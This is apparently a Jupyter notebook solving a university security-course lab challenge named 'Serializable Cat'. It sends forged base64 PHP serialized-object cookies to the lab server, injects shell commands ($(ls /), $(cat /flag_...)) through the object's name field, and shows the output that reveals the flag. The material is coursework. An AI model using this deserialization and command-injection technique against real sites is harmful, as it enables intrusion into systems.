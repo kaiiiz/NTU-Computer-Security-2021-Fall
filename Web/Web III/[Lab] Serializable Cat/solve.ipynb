{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "9d10346d-6a26-40c6-b825-3d1e9c4d35ec",
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "3798197b-e47e-437f-ac97-1113ad705938",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'<pre> ______________________________________\\n/ Welcome back, bin boot dev etc       \\\\\\n| flag_5fb2acebf1d0c558 home lib lib64 |\\n| media mnt opt proc root run sbin srv |\\n\\\\ sys tmp usr var                      /\\n --------------------------------------\\n        \\\\   ^__^\\n         \\\\  (oo)\\\\_______\\n            (__)\\\\       )\\\\/\\\\\\n                ||----w |\\n                ||     ||\\n</pre><p>Hello, \\' $(ls /) \\'.</p>\\n<a href=\"/?source\">source code</a>\\n'"
      ]
     },
     "execution_count": 2,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# ' $(ls /) '\n",
    "cookies={\"cat_session\": \"TzozOiJDYXQiOjE6e3M6NDoibmFtZSI7czoxMToiJyAkKGxzIC8pICciO30=\"}\n",
    "\n",
    "requests.get(\"http://h4ck3r.quest:8601/\", cookies=cookies).text"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "904ddec1-9c4a-409d-911c-2af74667aa79",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'<pre> _________________________________________\\n< Welcome back, FLAG{d3serializable_c4t}  >\\n -----------------------------------------\\n        \\\\   ^__^\\n         \\\\  (oo)\\\\_______\\n            (__)\\\\       )\\\\/\\\\\\n                ||----w |\\n                ||     ||\\n</pre><p>Hello, \\' $(cat /flag_5fb2acebf1d0c558) \\'.</p>\\n<a href=\"/?source\">source code</a>\\n'"
      ]
     },
     "execution_count": 3,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# ' $(cat /flag_5fb2acebf1d0c558) '\n",
    "cookies={\"cat_session\": \"TzozOiJDYXQiOjE6e3M6NDoibmFtZSI7czozMzoiJyAkKGNhdCAvZmxhZ181ZmIyYWNlYmYxZDBjNTU4KSAnIjt9\"}\n",
    "\n",
    "requests.get(\"http://h4ck3r.quest:8601/\", cookies=cookies).text"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.9"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
